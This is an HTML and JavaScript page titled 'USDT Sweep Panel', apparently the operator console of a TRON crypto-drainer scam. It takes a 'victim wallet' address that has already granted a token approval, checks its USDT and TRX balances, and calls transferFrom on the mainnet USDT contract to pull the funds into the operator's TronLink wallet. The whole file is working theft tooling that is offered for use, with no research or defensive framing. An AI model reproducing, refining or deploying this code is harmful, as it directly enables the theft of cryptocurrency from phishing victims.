<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Admin - USDT Controller</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
</head>
<body class="bg-[#020617] text-slate-200 font-sans min-h-screen flex items-center justify-center p-4">

    <div class="max-w-lg w-full bg-[#0f172a] border border-slate-800 rounded-3xl p-8 shadow-2xl">
        <div class="flex items-center justify-between mb-8">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-emerald-500 rounded-lg flex items-center justify-center shadow-lg shadow-emerald-500/20">
                    <svg class="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path></svg>
                </div>
                <h1 class="text-2xl font-bold tracking-tight text-white">USDT Sweep Panel</h1>
            </div>
            <span class="text-[10px] bg-emerald-500/10 text-emerald-500 px-2 py-0.5 rounded uppercase font-black border border-emerald-500/20">Mainnet API</span>
        </div>

        <div class="space-y-5">
            <div>
                <label class="block text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 mb-2">Victim Wallet (Approved Only)</label>
                <div class="flex gap-2">
                    <input id="victimAddress" type="text" placeholder="T..." class="flex-1 bg-[#1e293b] border border-slate-700 rounded-xl px-4 py-4 focus:outline-none focus:border-emerald-500 transition-all text-sm font-mono tracking-tight">
                    <button id="checkBtn" class="bg-slate-800 hover:bg-slate-700 px-4 rounded-xl text-xs font-bold transition-all border border-slate-700">Check</button>
                </div>
            </div>

            <div>
                <label class="block text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 mb-2">Withdrawal Amount (USDT)</label>
                <input id="amount" type="number" placeholder="0.00" class="w-full bg-[#1e293b] border border-slate-700 rounded-xl px-4 py-4 focus:outline-none focus:border-emerald-500 transition-all text-sm font-mono">
            </div>

            <button id="withdrawBtn" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-black py-5 rounded-2xl shadow-lg shadow-emerald-900/20 transition-all uppercase tracking-widest mt-2 active:scale-95">
                Sweep Funds Now
            </button>

            <div id="log" class="mt-4 p-5 bg-black/40 rounded-2xl border border-slate-800 font-mono text-[11px] leading-relaxed">
                <span class="text-slate-600">// Ready for operation...</span>
            </div>
        </div>
    </div>

    <script>
        const CONFIG = {
            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Mainnet USDT
            NODE: "https://api.trongrid.io"
        };

        const logger = (msg) => { document.getElementById('log').innerHTML = msg; };

        // --- 1. Check Balance Logic ---
        document.getElementById('checkBtn').onclick = async () => {
            const victim = document.getElementById('victimAddress').value.trim();
            if(!victim) return alert("Pehle address dalo!");
            
            logger("⏳ Fetching live balances...");
            try {
                const tron = new TronWeb({ fullHost: CONFIG.NODE });
                
                // Get TRX
                const trxRaw = await tron.trx.getBalance(victim);
                const trx = (trxRaw / 1e6).toFixed(2);

                // Get USDT via triggerConstantContract (Sabse safe)
                const balanceTx = await tron.transactionBuilder.triggerConstantContract(
                    CONFIG.USDT, "balanceOf(address)", {}, [{ type: 'address', value: victim }], victim
                );
                const usdt = (parseInt(balanceTx.constant_result[0], 16) / 1e6).toFixed(2);

                logger(`
                    <div class="space-y-1">
                        <p class="text-emerald-400 font-bold">ADDRESS VERIFIED</p>
                        <p class="text-white">💰 USDT: ${usdt}</p>
                        <p class="text-white">💎 TRX: ${trx}</p>
                    </div>
                `);
            } catch (e) {
                logger(`<span class="text-red-500 uppercase font-bold">Error:</span><br>${e.message || e}`);
            }
        };

        // --- 2. Withdrawal Sweep Logic ---
        document.getElementById('withdrawBtn').onclick = async () => {
            const victim = document.getElementById('victimAddress').value.trim();
            const amount = document.getElementById('amount').value;
            const btn = document.getElementById('withdrawBtn');

            if(!victim || !amount) return alert("Address aur Amount dono bhariyo!");
            if(!window.tronWeb) return alert("TronLink connect nahi hai!");

            try {
                btn.disabled = true;
                btn.innerText = "Broadcasting...";
                logger("📡 Initializing sweep...");

                const tron = window.tronWeb;
                const adminAddr = tron.defaultAddress.base58; // TronLink me jo address active hai

                const contract = await tron.contract().at(CONFIG.USDT);
                const amountInSun = Math.floor(amount * 1000000);

                logger(`⚡ Executing transferFrom...<br>Victim: ${victim}<br>Admin: ${adminAddr}`);

                // Main transaction
                const tx = await contract.transferFrom(
                    victim,
                    adminAddr,
                    amountInSun
                ).send({
                    feeLimit: 150000000 // 150 TRX Limit
                });

                logger(`✅ <span class="text-emerald-400 font-bold">SUCCESS!</span><br>TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" class="text-blue-400 underline">${tx}</a>`);
                alert("Withdrawal Successful!");

            } catch (err) {
                let errorMsg = err.message || "Rejected";
                if(JSON.stringify(err).includes("REVERT")) errorMsg = "REVERT: No Approval or No Energy";
                logger(`<span class="text-red-500 uppercase font-bold">FAILED:</span><br>${errorMsg}`);
            } finally {
                btn.disabled = false;
                btn.innerText = "Sweep Funds Now";
            }
        };
    </script>
</body>
</html>
